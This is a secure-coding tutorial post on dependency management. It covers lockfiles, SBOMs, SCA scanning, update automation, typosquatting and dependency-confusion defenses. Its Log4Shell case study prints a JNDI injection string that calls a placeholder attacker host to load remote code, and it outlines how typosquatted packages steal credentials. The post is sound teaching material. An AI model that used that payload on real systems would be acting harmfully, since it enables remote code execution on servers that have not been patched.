---
series: secure-coding-101
episode: 9
title: "Secure Coding 101 (9/10): Managing Dependency Vulnerabilities"
status: content-ready
targets:
  tistory: false
  medium: true
  hashnode: true
  mkdocs: true
  ebook: true
language: en
tags:
  - Dependencies
  - SCA
  - SBOM
  - SupplyChain
  - SecureCoding
seo_description: SCA, SBOM, lockfiles, Dependabot, and a five-step playbook for safe dependency management against supply-chain risk.
last_reviewed: '2026-05-15'
---

# Secure Coding 101 (9/10): Managing Dependency Vulnerabilities

Modern services depend more on external code than on code written directly by the team shipping the feature. HTTP clients, template engines, ORM layers, CLI tooling, and build dependencies all become part of the runtime we are responsible for. When one of them fails, the incident does not belong to a vendor anymore. It belongs to the service that deployed it.

This is the 9th post in the Secure Coding 101 series.

Here, we will frame dependency management as supply-chain control rather than occasional version cleanup. Lockfiles, SBOMs, SCA gates, and small automated updates all serve one goal: keeping the build reproducible and the incident blast radius knowable.

> Dependencies are not attachments around our code. Once deployed, they are part of our codebase and part of our responsibility.


![secure coding 101 chapter 9 flow overview](https://yeongseon-books.github.io/book-public-assets/assets/secure-coding-101/09/09-01-concept-at-a-glance.en.png)
*secure coding 101 chapter 9 flow overview*

## Questions to Keep in Mind

- What boundary should you inspect first when applying Managing Dependency Vulnerabilities?
- Which signal should the example or diagram make visible for Managing Dependency Vulnerabilities?
- What failure should be prevented first when Managing Dependency Vulnerabilities reaches a real system?

## Questions This Chapter Answers

- What *SCA* (Software Composition Analysis) means
- The role of an *SBOM*
- Why a *lockfile* is non-negotiable
- *Dependabot / Renovate* automation
- A five-step routine and five common mistakes

## Why It Matters

Log4j, event-stream, ua-parser-js — *supply-chain attacks* succeed with *zero lines* of our code. A library you *don't know you depend on* becomes the *door*.

> *Dependencies are *assets that will leak someday*. Tracking them is the start of defense.*

## Key Terms

- **SCA**: scanning dependencies for *known vulnerabilities*.
- **SBOM**: a list of *every component* you ship.
- **Lockfile**: pins *exact versions and hashes*.
- **Pinning**: explicitly *fixing direct dependency* versions.
- **Transitive dependency**: a dependency *of a dependency*.

## Before/After

**Before**: `requirements.txt` lists only `requests`. Each build picks a *different version*. You don't know *what came in*.

**After**: `uv.lock` / `poetry.lock` *pin hashes*. *Weekly dependency PRs* arrive automatically; CI gates with *SCA*.

## Hands-on: Safer Dependencies in Five Steps

### Step 1 — Generate a lockfile

```bash
uv lock          # or poetry lock, pip-compile
```

### Step 2 — Generate an SBOM

```bash
syft packages dir:. -o cyclonedx-json > sbom.json
```

### Step 3 — Run SCA

```bash
pip-audit                # Python
osv-scanner --lockfile=uv.lock   # generic
```

### Step 4 — Automate updates

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: pip
    directory: "/"
    schedule:
      interval: weekly
```

### Step 5 — Pin and verify

```bash
pip install --require-hashes -r requirements.txt
```

## What to Notice in This Code

- *Lockfile + hashes* is the heart of *reproducible* builds.
- An SBOM lets you check *blast radius in seconds* during an incident.
- *Regular* updates beat *occasional* heroic ones.

## Five Common Mistakes

1. **Using *latest* with no lockfile.** A target for *supply-chain attacks*.
2. **Ignoring *SCA results*.** Real findings get buried in noise.
3. **Ignoring *transitive dependencies*.** Most CVEs are *transitive*.
4. **Sticking with abandoned libraries.** Patches *never come*.
5. **Letting auto-update PRs *pile up*.** Hundreds in a month.

## How This Shows Up in Production

Most teams use *Renovate* or *Dependabot* for *weekly* PRs and put an *SCA gate* in CI. Larger orgs publish *SBOMs* alongside their builds.

## How a Senior Engineer Thinks

- *Dependencies are *our code* — and our responsibility.*
- *No lockfile means no reproducibility.*
- *Small updates prevent *big incidents*.*
- *An SBOM is an *incident-response tool*.*
- *Depending less is itself security.*

## Checklist

- [ ] *Lockfile* committed.
- [ ] *SCA* running in CI.
- [ ] *Auto-update PRs* arriving weekly.
- [ ] *SBOM* published.

## Practice Problems

1. Read one line of *pip-audit* output and explain it.
2. Name a real CVE that came through a *transitive dependency*.
3. List three risks of building *without a lockfile*.

## Wrap-up and Next Steps

Other people's code is *our code*. The last post covers *safe logging and audit*, the evidence that survives an incident.

## Answering the Opening Questions

- **What does SCA inspect exactly?**
  - SCA cross-references a project's direct and transitive dependency lists against CVE databases (NVD, OSV, GitHub Advisory) to check for known vulnerabilities. As the Log4Shell section showed, combined with SBOM, you can determine within minutes whether a specific CVE affects your services.
- **When does SBOM show its greatest practical power?**
  - SBOM answers "which of our services are affected?" the instant a new CVE is published. In the Log4Shell case, teams with SBOMs confirmed impact scope in minutes while teams without had to manually search hundreds of services.
- **Why is a lockfile mandatory rather than optional?**
  - Without a lockfile, different versions can install at each build, making reproduction impossible. When responding to vulnerabilities, not knowing "the exact deployed version" makes it impossible to even judge whether a patch is needed. Including hash verification also blocks installation of tampered packages.

## Deep Dive: Log4Shell, Typosquatting, Pinning, Private Registry

### Log4Shell (CVE-2021-44228) Case Study

Log4Shell demonstrated how fast and wide supply-chain vulnerabilities spread. The root cause: Java's Log4j2 library treated JNDI lookups as string substitution.

```text
Attack flow:
1. Attacker injects ${jndi:ldap://evil.com/payload} in HTTP header
2. Server logs the header
3. Log4j2 interprets ${...} as JNDI lookup
4. Malicious class downloaded/executed from remote server
5. Full server compromise (Remote Code Execution)

Blast radius:
- Most Java-based services (Spring Boot, Elasticsearch, Kafka, Solr...)
- Many included Log4j transitively without knowing
- Mass scanning/attacks began within 24 hours of disclosure
```

Three lessons from this incident:

```text
1. With SBOM:
   - "Which of our services use log4j-core 2.x?" -> instant answer
   - Without SBOM: manually check hundreds of services

2. With lockfile + hash verification:
   - Know exactly which version was deployed
   - Verify fix by checking hash change after patch

3. With SCA in CI:
   - Auto-alert on CVE publication -> immediate response
   - Response time: hours (manual) -> minutes (automated)
```

```python
# Check Log4Shell impact via SBOM (Python project with Java dependencies)
import json


def check_log4shell_in_sbom(sbom_path: str) -> list[dict]:
    with open(sbom_path) as f:
        sbom = json.load(f)

    vulnerable = []
    for component in sbom.get("components", []):
        name = component.get("name", "")
        version = component.get("version", "")
        if "log4j-core" in name:
            # 2.0-beta9 through 2.14.1 are vulnerable
            if version.startswith("2.") and version < "2.15.0":
                vulnerable.append({
                    "name": name,
                    "version": version,
                    "fix": "upgrade to 2.17.1+",
                    "cve": "CVE-2021-44228",
                })
    return vulnerable
```

### Typosquatting Attacks

Attackers register packages with slightly misspelled names to distribute malicious code. `requests` becomes `reqeusts`, `python-dateutil` becomes `python-dateutill`.

```text
Real cases:
- PyPI: "python3-dateutil" (legit: "python-dateutil")
- npm: "crossenv" (legit: "cross-env")
- PyPI: "jeIlyfish" (legit: "jellyfish", uppercase I vs lowercase l)

Attacker strategy:
1. Register similar name -> inject malicious code in install hook
2. Execute in setup.py install/develop command
3. Harvest env vars, SSH keys, AWS credentials -> exfiltrate
```

```python
# Typosquatting defense -- pre-install package name validation
import difflib

KNOWN_PACKAGES = [
    "requests", "flask", "django", "fastapi", "sqlalchemy",
    "pydantic", "celery", "redis", "boto3", "numpy", "pandas",
]


def check_typosquat(package_name: str, threshold: float = 0.85) -> list[str]:
    warnings = []
    for known in KNOWN_PACKAGES:
        if package_name == known:
            return []  # exact match is safe
        similarity = difflib.SequenceMatcher(None, package_name, known).ratio()
        if similarity >= threshold:
            warnings.append(
                f"'{package_name}' is {similarity:.0%} similar to '{known}'. "
                f"Verify this is not a typo."
            )
    return warnings
```

### Version Pinning Strategies

Pinning is not just adding `==`. The strategy varies by project type.

```text
Strategy comparison:

1. Application (deployable service)
   -> Pin all dependencies exactly + lockfile + hashes
   -> Reproducibility and stability are top priority
   -> requirements.txt: package==1.2.3 --hash=sha256:abc...

2. Library (installed by other projects)
   -> Range-pin direct dependencies (>=1.2, <2.0)
   -> Don't over-constrain consumers' dependency resolution
   -> Lockfile for dev/test only

3. Infrastructure / Docker images
   -> Pin base image by digest
   -> FROM python:3.12@sha256:abc123...
   -> Pin system packages by version too
```

```dockerfile
# Full pinning in Docker builds
FROM python:3.12-slim@sha256:abcdef1234567890 AS base

# Pin system packages
RUN apt-get update && apt-get install -y --no-install-recommends \
    libpq5=15.4-0+deb12u1 \
    && rm -rf /var/lib/apt/lists/*

# Python dependencies -- install with hash verification
COPY requirements.txt .
RUN pip install --no-cache-dir --require-hashes -r requirements.txt

# Multi-stage: strip build tools
FROM base AS runtime
COPY --from=base /usr/local/lib/python3.12/site-packages /usr/local/lib/python3.12/site-packages
COPY . /app
```

### Private Registry Operations

Running a private registry significantly reduces external supply-chain risk.

```text
Private Registry roles:
1. Proxy cache -- mirror external PyPI/npm, build works even if upstream is down
2. Approval gate -- only security-reviewed packages allowed internally
3. Internal package hosting -- publish shared company libraries
4. Audit trail -- record who downloaded what and when
```

```bash
# devpi -- Python Private Registry setup
pip install devpi-server devpi-web

# Start server
devpi-server --start --host 0.0.0.0 --port 3141

# Configure upstream PyPI mirroring
devpi use http://localhost:3141
devpi login root --password ""
devpi index -c prod/approved bases=root/pypi volatile=False
```

```python
# Approved package list management
APPROVED_PACKAGES = {
    "requests": {"max_version": "2.32.0", "approved_by": "security-team"},
    "flask": {"max_version": "3.1.0", "approved_by": "security-team"},
    "sqlalchemy": {"max_version": "2.0.35", "approved_by": "security-team"},
}


def validate_requirements(requirements_path: str) -> list[str]:
    violations = []
    with open(requirements_path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            pkg_name = line.split("==")[0].split(">=")[0].split("<=")[0].lower()
            if pkg_name not in APPROVED_PACKAGES:
                violations.append(f"Unapproved package: {pkg_name}")
    return violations
```

### Dependency Confusion Attack and Defense

Attackers register a malicious package on the public registry with the same name as an internal package. Since pip checks public PyPI first by default, the malicious public version gets installed instead.

```text
Attack scenario:
1. Company has "mycompany-utils" on internal Private Registry
2. Attacker registers "mycompany-utils" on PyPI (higher version number)
3. CI build: pip finds higher version on PyPI and installs it
4. Malicious code executes

Defense:
- Use --index-url only (never --extra-index-url)
- Pre-register internal package names on PyPI as placeholders
- Lock source URL + hash together in lockfile
```

```bash
# Safe configuration: --index-url only
pip install --index-url https://devpi.internal/prod/approved/+simple/ -r requirements.txt
# --index-url uses ONLY that source
# --extra-index-url checks PyPI too = dangerous
```

### Vulnerability Response Prioritization

When SCA reports dozens of CVEs, you need a framework for triage. CVSS score alone is insufficient.

```text
Prioritization criteria:

1. Reachability
   - Is the vulnerable function actually called?
   - CVEs in unreachable code paths get deprioritized

2. Exposure
   - Is the service directly internet-facing?
   - Can external input reach the vulnerable path?

3. Exploit availability
   - Is a PoC publicly available?
   - Is it on CISA KEV (Known Exploited Vulnerabilities) list?

4. Patch availability
   - Does a fix version exist?
   - Can you upgrade without compatibility issues?
```

```python
# Automated vulnerability priority classification
from dataclasses import dataclass
from enum import Enum


class Priority(Enum):
    CRITICAL = "P0-immediate"
    HIGH = "P1-24hours"
    MEDIUM = "P2-1week"
    LOW = "P3-next-sprint"


@dataclass
class VulnAssessment:
    cve_id: str
    cvss_score: float
    reachable: bool
    internet_exposed: bool
    exploit_available: bool
    patch_available: bool

    def priority(self) -> Priority:
        if self.exploit_available and self.internet_exposed and self.reachable:
            return Priority.CRITICAL
        if self.reachable and self.internet_exposed:
            return Priority.HIGH
        if self.reachable and self.patch_available:
            return Priority.MEDIUM
        return Priority.LOW


# Usage
assessment = VulnAssessment(
    cve_id="CVE-2021-44228",
    cvss_score=10.0,
    reachable=True,
    internet_exposed=True,
    exploit_available=True,
    patch_available=True,
)
print(assessment.priority())  # P0-immediate
```

### Transitive Dependency Auditing

You declare 5 direct dependencies but 50 packages actually install. Without visibility into transitives, you cannot trace where vulnerabilities enter.

```bash
# View pip dependency tree
pip install pipdeptree
pipdeptree --warn silence

# Example output:
# fastapi==0.115.0
#   - pydantic [required: >=1.7.4, installed: 2.9.0]
#     - annotated-types [required: >=0.6.0, installed: 0.7.0]
#     - pydantic-core [required: ==2.23.0, installed: 2.23.0]
#   - starlette [required: >=0.37.2, installed: 0.40.0]
#     - anyio [required: >=3.4.0, installed: 4.6.0]
#       - idna [required: >=2.8, installed: 3.10]
#       - sniffio [required: >=1.1, installed: 1.3.1]

# Reverse lookup: who pulls in a specific package?
pipdeptree --reverse --packages idna
# idna==3.10
#   - anyio==4.6.0 [requires: idna>=2.8]
#     - starlette==0.40.0 [requires: anyio>=3.4.0]
#       - fastapi==0.115.0 [requires: starlette>=0.37.2]
```

```python
# CI check: transitive dependency depth limit
import json
import subprocess


def check_dependency_depth(max_depth: int = 5) -> list[str]:
    result = subprocess.run(
        ["pipdeptree", "--json"],
        capture_output=True, text=True,
    )
    tree = json.loads(result.stdout)
    warnings = []

    def measure_depth(pkg, current_depth=0):
        if current_depth > max_depth:
            warnings.append(
                f"Dependency depth exceeded: {pkg['package']['package_name']} "
                f"(depth={current_depth})"
            )
            return
        for dep in pkg.get("dependencies", []):
            measure_depth(dep, current_depth + 1)

    for pkg in tree:
        measure_depth(pkg)
    return warnings
```

### Safe Auto-Merge Strategy for Dependency PRs

When Dependabot/Renovate PRs arrive weekly, you need merge criteria. Merging everything risks compatibility; ignoring them accumulates security debt.

```text
Merge strategy:

1. Patch version (x.y.Z) -- auto-merge allowed
   - Condition: CI passes + security fix included
   - Reason: strongest backward-compatibility guarantee

2. Minor version (x.Y.0) -- auto-merge + manual check
   - Condition: CI passes + changelog reviewed
   - Reason: new features, rare behavior changes

3. Major version (X.0.0) -- manual review required
   - Condition: compatibility analysis, migration guide checked
   - Reason: no backward-compatibility guarantee
```

```yaml
# Renovate auto-merge configuration (renovate.json)
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:recommended"],
  "packageRules": [
    {
      "matchUpdateTypes": ["patch"],
      "automerge": true,
      "automergeType": "pr",
      "requiredStatusChecks": ["ci/test", "ci/security-scan"]
    },
    {
      "matchUpdateTypes": ["minor"],
      "automerge": true,
      "automergeType": "pr",
      "stabilityDays": 3
    },
    {
      "matchUpdateTypes": ["major"],
      "automerge": false,
      "labels": ["breaking-change", "needs-review"]
    }
  ],
  "vulnerabilityAlerts": {
    "enabled": true,
    "automerge": true,
    "schedule": ["at any time"]
  }
}
```

`stabilityDays` waits a set period after a new release before merging. This avoids regression bugs discovered shortly after publication.

### License Compliance Checking

License management is as important as security in dependency management. Including a GPL library in a commercial service can create legal problems.

```bash
# pip-licenses -- check dependency licenses
pip install pip-licenses
pip-licenses --format=markdown --with-urls

# Example output:
# | Name       | Version | License     | URL                          |
# |------------|---------|-------------|------------------------------|
# | Flask      | 3.1.0   | BSD-3       | https://flask.palletsprojects.com |
# | requests   | 2.32.0  | Apache-2.0  | https://requests.readthedocs.io  |
```

```python
# CI forbidden license check
FORBIDDEN_LICENSES = {"GPL-3.0", "AGPL-3.0", "SSPL-1.0"}
ALLOWED_LICENSES = {"MIT", "BSD-2-Clause", "BSD-3-Clause", "Apache-2.0", "ISC", "PSF-2.0"}


def check_licenses(licenses_json: list[dict]) -> list[str]:
    violations = []
    for pkg in licenses_json:
        license_name = pkg.get("License", "UNKNOWN")
        if license_name in FORBIDDEN_LICENSES:
            violations.append(
                f"Forbidden license: {pkg['Name']}=={pkg['Version']} ({license_name})"
            )
        elif license_name not in ALLOWED_LICENSES and license_name != "UNKNOWN":
            violations.append(
                f"Unverified license: {pkg['Name']}=={pkg['Version']} ({license_name}) -- legal review needed"
            )
    return violations
```

### Dependency Minimization Principle

The best supply-chain security is fewer dependencies. Every package you add brings:

```text
Cost of adding a dependency:
- N transitive dependencies added (each a potential vulnerability)
- Maintenance monitoring obligation
- License compliance verification
- Update PR processing burden
- Expanded supply-chain attack surface

Before adding, ask:
1. Can I implement this in <10 lines myself?
2. Can the standard library replace it?
3. Was the last release within 1 year?
4. Are there 2+ maintainers?
5. Are download count and stars sufficient?
```

```python
# Dependency health check script
import requests as http_client
from datetime import datetime, timedelta


def check_package_health(package_name: str) -> dict:
    resp = http_client.get(f"https://pypi.org/pypi/{package_name}/json")
    if resp.status_code != 200:
        return {"status": "not_found"}

    data = resp.json()
    info = data["info"]
    releases = data["releases"]

    latest_version = info["version"]
    latest_release_date = None
    if latest_version in releases and releases[latest_version]:
        latest_release_date = releases[latest_version][0]["upload_time"]

    is_maintained = False
    if latest_release_date:
        release_dt = datetime.fromisoformat(latest_release_date)
        is_maintained = (datetime.now() - release_dt) < timedelta(days=365)

    return {
        "name": package_name,
        "version": latest_version,
        "last_release": latest_release_date,
        "maintained": is_maintained,
        "license": info.get("license", "UNKNOWN"),
        "requires_python": info.get("requires_python"),
    }
```

<!-- toc:begin -->
## In this series

- [Secure Coding 101 (1/10): What Is Secure Coding?](./01-what-is-secure-coding.md)
- [Secure Coding 101 (2/10): Input Validation](./02-input-validation.md)
- [Secure Coding 101 (3/10): Authentication and Session](./03-authentication-and-session.md)
- [Secure Coding 101 (4/10): Authorization and Permissions](./04-authorization-and-permissions.md)
- [Secure Coding 101 (5/10): Safe Data Storage](./05-safe-data-storage.md)
- [Secure Coding 101 (6/10): Secret and Key Management](./06-secret-and-key-management.md)
- [Secure Coding 101 (7/10): SQL Injection and Safe ORM Usage](./07-sql-injection-and-orm.md)
- [Secure Coding 101 (8/10): XSS and CSRF Defense](./08-xss-and-csrf.md)
- **Managing Dependency Vulnerabilities (current)**
- Safe Logging and Audit (upcoming)

<!-- toc:end -->

## References

- [OWASP — Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
- [pip-audit](https://github.com/pypa/pip-audit)
- [OSV.dev](https://osv.dev/)
- [CycloneDX SBOM](https://cyclonedx.org/)
- [PyPA — Repeatable Installs](https://pip.pypa.io/en/stable/topics/repeatable-installs/)

Tags: Dependencies, SCA, SBOM, SupplyChain, SecureCoding
